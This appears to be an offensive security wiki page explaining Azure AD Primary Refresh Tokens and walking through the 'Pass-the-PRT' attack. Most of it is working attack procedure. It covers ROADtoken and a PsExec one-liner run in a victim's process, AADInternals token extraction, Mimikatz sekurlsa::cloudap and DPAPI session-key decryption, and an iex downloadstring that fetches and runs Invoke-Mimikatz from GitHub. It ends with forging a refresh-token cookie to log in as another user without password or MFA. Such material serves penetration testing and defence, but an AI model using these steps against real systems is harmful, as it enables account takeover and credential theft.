## What is a PRT

A **Primary Refresh Token (PRT)** is used to provide a **single sign-on (SSO)** experience for users of Windows 10 and mobile OSes.

When you log in in a device supporting thins SSO, Windows will **communicate with the Cloud Authentication Provider, validate** your credentials and **returns** the **PRT** and a **session key**. The **PRT is stored in LSASS**, and the **session key gets re-encrypted** with the local devices TPM and then stored alongside the PRT.

Then, when the **browser** tries to access resources on the cloud, a **PRT cookie** is used to access them.

Once issued, a **PRT** is **valid** for **14 days** and is **continuously renewed** as long as the user actively uses the device. A PRT only has **MFA claims** if when accessing RDP you use **windows hello** or **windows account manager**.

It can be used to obtain access and refresh token to any application.

For more information about how this works read the [**documentation**](https://docs.microsoft.com/en-us/azure/active-directory/devices/concept-primary-refresh-token) or [**this page**](https://stealthbits.com/blog/lateral-movement-to-the-cloud-pass-the-prt/).

### Check if you have a PRT

```
Dsregcmd.exe /status
```

In the SSO State section, you should see the **`AzureAdPrt`** set to **YES**.

In the same output you can also see if the **device is joined to Azure** (in the field `AzureAdJoined`):

## Pass-the-PRT

### Steps

1. **Extract** the **PRT from LSASS** and save this for later.
2. **Extract** the **Session Key**. If you remember this is issued and then re-encrypted by the local device, so we need to **decrypt this using a DPAPI masterkey**. For more info about DPAPI check this [**HackTricks**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords) link or the [**Pass-the-cookie attack**](az-pass-the-cookie.md).
3. Using the decrypted Session Key, we will obtain the derived key for the PRT and the context. This is needed to **create our PRT cookie**. The derived key is what is used to sign the JWT for the cookie. Dirk-jan did a great job explaining this process [here](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/).

Now we have everything we need to sign our own PRT Cookies and the rest of these steps can be done from any other system.

* We will use the PRT, derived key, and context to create a new PRT Cookie.
* Import the cookie into your browser session (we’ll use Chrome)
* That’s it! You should now be authenticated as that user without having to know their password, or handle any MFA prompts.

### Attack - Roadtoken

For more info about this way [**check this post**](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/). To generate a valid PRT cookie the first thing you need is a nonce.\
You can get this with:

```powershell
$TenantId = "19a03645-a17b-129e-a8eb-109ea7644bed"
$URL = "https://login.microsoftonline.com/$TenantId/oauth2/token"

$Params = @{
    "URI"     = $URL
    "Method"  = "POST"
}
$Body = @{
"grant_type" = "srv_challenge"
}
$Result = Invoke-RestMethod @Params -UseBasicParsing -Body $Body
$Result.Nonce
AwABAAAAAAACAOz_BAD0_8vU8dH9Bb0ciqF_haudN2OkDdyluIE2zHStmEQdUVbiSUaQi_EdsWfi1 9-EKrlyme4TaOHIBG24v-FBV96nHNMgAA
```

Or using [**roadrecon**](https://github.com/dirkjanm/ROADtools):

```powershell
roadrecon auth prt-init
```

Then you can use [**roadtoken**](https://github.com/dirkjanm/ROADtoken) to get a new PRT (run in the tool from a process of the user to attack):

```powershell
.\ROADtoken.exe <nonce>
```

As oneliner:

{% code overflow="wrap" %}
```powershell
Invoke-Command - Session $ps_sess -ScriptBlock{C:\Users\Public\PsExec64.exe - accepteula -s "cmd.exe" " /c C:\Users\Public\SessionExecCommand.exe UserToImpersonate C:\Users\Public\ROADToken.exe AwABAAAAAAACAOz_BAD0__kdshsy61GF75SGhs_[...] > C:\Users\Public\PRT.txt"}
```
{% endcode %}

Then you can use the **generated cookie** to **generate tokens** to **login** using Azure AD **Graph** or Microsoft Graph:

```powershell
roadrecon auth --prt-cookie <prt_cookie>

Connect-AzureAD --AadAccessToken <token> --IaccountId <acc_ind>
```

### Attack - Using AADInternals

`Get-AADIntUserPRTToken` **gets user’s PRT token** from the Azure AD joined or Hybrid joined computer. Uses `BrowserCore.exe` to get the PRT token.

```powershell
# Get the PRToken
$prtToken = Get-AADIntUserPRTToken

# Get an access token for AAD Graph API and save to cache
Get-AADIntAccessTokenForAADGraph -PRTToken $prtToken
```

### ~~Attack - Mimikatz~~

{% hint style="warning" %}
This won't work post August 2021 fixes as only the user can get his PRT (a local admin cannot access other users PRTs)
{% endhint %}

You can use **mimikatz** to extract the PRT:

```powershell
mimikatz.exe
Privilege::debug
Sekurlsa::cloudap

# Or in powershell
iex (New-Object Net.Webclient).downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1")
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap"'
```

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

**Copy** the part labeled **Prt** and save it.\
Extract also the session key or “**ProofOfPosessionKey**” which you can see highlighted below. This is encrypted and we will need to use our DPAPI masterkeys to decrypt it.

<figure><img src="../../../.gitbook/assets/image (11) (2).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
If you don’t see any PRT data it could be that you **don’t have any PRTs** because your device isn’t Azure AD joined or it could be you are **running an old version** of Windows 10.
{% endhint %}

To **decrypt** the session key you need to **elevate** your privileges to **SYSTEM** to run under the computer context to be able to use the **DPAPI masterkey to decrypt it**. You can use the following commands to do so:

```
Token::elevate
Dpapi::cloudapkd /keyvalue:[PASTE ProofOfPosessionKey HERE] /unprotect
```

<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Now you want to copy both the Context value:

<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

And the derived key value:

<figure><img src="../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Finally you can use all this info to **generate PRT cookies**:

```
Dpapi::cloudapkd /context:[CONTEXT] /derivedkey:[DerivedKey] /Prt:[PRT]
```

<figure><img src="../../../.gitbook/assets/image (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

Go to [https://login.microsoftonline.com](https://login.microsoftonline.com), clear all cookies for login.microsoftonline.com and enter a new cookie.

```
Name: x-ms-RefreshTokenCredential
Value: [Paste your output from above]
HttpOnly: Set to True (checked)
```

{% hint style="danger" %}
The rest should be the defaults. Make sure you can refresh the page and the cookie doesn’t disappear, if it does, you may have made a mistake and have to go through the process again. If it doesn’t, you should be good.
{% endhint %}
